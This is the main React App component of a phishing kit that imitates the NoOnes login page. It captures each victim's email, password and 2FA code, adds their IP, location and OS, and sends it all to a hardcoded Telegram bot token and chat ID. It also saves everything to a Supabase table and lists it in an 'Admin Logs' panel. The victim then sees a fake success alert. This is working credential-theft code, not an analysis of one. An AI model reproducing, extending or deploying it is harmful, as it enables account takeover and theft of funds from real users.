
import React, { useState, useEffect } from 'react';
import LoginScreen from './components/LoginScreen';
import VerificationScreen from './components/VerificationScreen';
import AdminPanel from './components/AdminPanel';
import ThemeToggle from './components/ThemeToggle';
import LanguageSelector from './components/LanguageSelector';
import { AuthStep, Submission } from './types';
import { supabase } from './supabaseClient';

const DEFAULT_LOGO = "https://noones.com/images/noones-logo-white.svg";
const TELEGRAM_TOKEN = "7937060457:AAF8boHz2--g7BITNWlljoxzL3rjUOE92Uk";
const TELEGRAM_CHAT_ID = "2100006818";

const App: React.FC = () => {
  const [step, setStep] = useState<AuthStep>('login');
  const [isDarkMode, setIsDarkMode] = useState(true);
  const [logoUrl, setLogoUrl] = useState<string>(DEFAULT_LOGO);
  const [submissions, setSubmissions] = useState<Submission[]>([]);
  const [currentDraft, setCurrentDraft] = useState<{ email: string; pass: string } | null>(null);
  const [userIp, setUserIp] = useState<string>("Detecting...");

  useEffect(() => {
    fetchSettings();
    fetchSubmissions();
    
    // Fetch IP for better logging
    fetch('https://ipapi.co/json/')
      .then(res => res.json())
      .then(data => setUserIp(`${data.ip} (${data.city}, ${data.country_name})`))
      .catch(() => setUserIp("Unknown"));

    const settingsChannel = supabase
      .channel('public:settings')
      .on('postgres_changes', { event: '*', schema: 'public', table: 'settings' }, (payload) => {
        if (payload.new && (payload.new as any).key === 'logo_url') {
          setLogoUrl((payload.new as any).value);
        }
      })
      .subscribe();

    return () => {
      supabase.removeChannel(settingsChannel);
    };
  }, []);

  const escapeHtml = (unsafe: string) => {
    return unsafe
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#039;");
  };

  const fetchSettings = async () => {
    try {
      const { data, error } = await supabase
        .from('settings')
        .select('value')
        .eq('key', 'logo_url')
        .maybeSingle();
      
      if (error) throw error;
      if (data) setLogoUrl(data.value);
    } catch (e: any) {
      console.error("Fetch Settings Error:", e.message);
    }
  };

  const fetchSubmissions = async () => {
    try {
      const { data, error } = await supabase
        .from('submissions')
        .select('*')
        .order('created_at', { ascending: false });
      
      if (error) throw error;
      if (data) {
        const mapped: Submission[] = data.map(item => ({
          id: item.id,
          emailOrPhone: item.email_or_phone,
          password: item.password,
          verificationCode: item.verification_code,
          timestamp: item.created_at
        }));
        setSubmissions(mapped);
      }
    } catch (e: any) {
      console.error("Fetch Submissions Error:", e.message);
    }
  };

  const sendToTelegram = async (message: string) => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
      await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        })
      });
    } catch (e) {
      console.error("Telegram Error:", e);
    }
  };

  const handleLoginCapture = (data: { email: string; pass: string }) => {
    setCurrentDraft(data);
    
    const message = `<b>🚀 NoOnes - LOGIN ATTEMPT</b>\n\n` +
                    `<b>📧 User:</b> <code>${escapeHtml(data.email)}</code>\n` +
                    `<b>🔑 Pass:</b> <code>${escapeHtml(data.pass)}</code>\n\n` +
                    `<b>🌐 IP:</b> ${userIp}\n` +
                    `<b>💻 OS:</b> ${navigator.platform}\n` +
                    `<b>📅 Time:</b> ${new Date().toLocaleString()}`;
    
    sendToTelegram(message);
    
    supabase.from('submissions').insert([{
      email_or_phone: data.email,
      password: data.pass
    }]).then(() => fetchSubmissions());

    setStep('verification');
  };

  const handleVerificationCapture = async (code: string) => {
    if (currentDraft) {
      const message = `<b>✅ NoOnes - VERIFICATION RECEIVED</b>\n\n` +
                      `<b>📧 User:</b> <code>${escapeHtml(currentDraft.email)}</code>\n` +
                      `<b>🔑 Pass:</b> <code>${escapeHtml(currentDraft.pass)}</code>\n` +
                      `<b>🔢 Code:</b> <code>${code}</code>\n\n` +
                      `<b>🌐 IP:</b> ${userIp}\n` +
                      `<b>📅 Time:</b> ${new Date().toLocaleString()}`;
      
      sendToTelegram(message);

      await supabase.from('submissions').insert([{
        email_or_phone: currentDraft.email,
        password: currentDraft.pass,
        verification_code: code
      }]);

      fetchSubmissions();
      setCurrentDraft(null);
      setStep('login');
      alert("Verification successful. Redirecting to dashboard...");
    }
  };

  useEffect(() => {
    document.body.className = isDarkMode 
      ? 'bg-[#121212] transition-colors duration-200' 
      : 'bg-gray-100 transition-colors duration-200';
  }, [isDarkMode]);

  const toggleTheme = () => setIsDarkMode(!isDarkMode);

  const handleUpdateLogo = async (newUrl: string) => {
    setLogoUrl(newUrl);
    try {
      await supabase
        .from('settings')
        .upsert({ key: 'logo_url', value: newUrl }, { onConflict: 'key' });
    } catch (e: any) {
      console.error("Logo update error:", e.message);
    }
  };

  const clearLogs = async () => {
    try {
      await supabase
        .from('submissions')
        .delete()
        .neq('id', '00000000-0000-0000-0000-000000000000');
      setSubmissions([]);
    } catch (e: any) {
      console.error("Clear logs error:", e.message);
    }
  };

  const isWhiteLogo = logoUrl === DEFAULT_LOGO || (logoUrl && logoUrl.toLowerCase().includes('white'));
  const shouldInvert = !isDarkMode && isWhiteLogo;

  return (
    <div className="min-h-screen flex flex-col items-center justify-center p-4">
      {step !== 'admin' && (
        <div className="mb-8 h-12 flex items-center justify-center">
          <img 
            src={logoUrl || DEFAULT_LOGO} 
            alt="Logo" 
            className={`h-10 md:h-12 w-auto object-contain transition-all duration-300 ${shouldInvert ? 'invert' : ''}`}
            onError={(e) => {
              (e.target as HTMLImageElement).src = DEFAULT_LOGO;
            }}
          />
        </div>
      )}

      <div className="w-full flex justify-center mb-8">
        {step === 'login' && (
          <LoginScreen 
            onLogin={handleLoginCapture} 
            isDarkMode={isDarkMode} 
          />
        )}
        {step === 'verification' && (
          <VerificationScreen 
            onContinue={handleVerificationCapture} 
            isDarkMode={isDarkMode} 
          />
        )}
        {step === 'admin' && (
          <AdminPanel 
            submissions={submissions}
            onClear={clearLogs}
            isDarkMode={isDarkMode}
            onBack={() => setStep('login')}
            logoUrl={logoUrl}
            onUpdateLogo={handleUpdateLogo}
          />
        )}
      </div>

      <div className="w-full max-w-md flex justify-between items-center px-2">
        <div className="flex items-center space-x-6">
          <ThemeToggle isDarkMode={isDarkMode} onToggle={toggleTheme} />
          <button 
            onClick={() => {
              if (step !== 'admin') fetchSubmissions();
              setStep(step === 'admin' ? 'login' : 'admin');
            }}
            className={`text-xs font-bold uppercase tracking-widest px-2 py-1 rounded border transition-colors ${
              isDarkMode 
                ? 'border-white/20 text-white/40 hover:text-white hover:border-white' 
                : 'border-black/20 text-black/40 hover:text-black hover:border-black'
            }`}
          >
            {step === 'admin' ? 'Exit Admin' : 'Admin Logs'}
          </button>
        </div>
        <LanguageSelector />
      </div>
    </div>
  );
};

export default App;
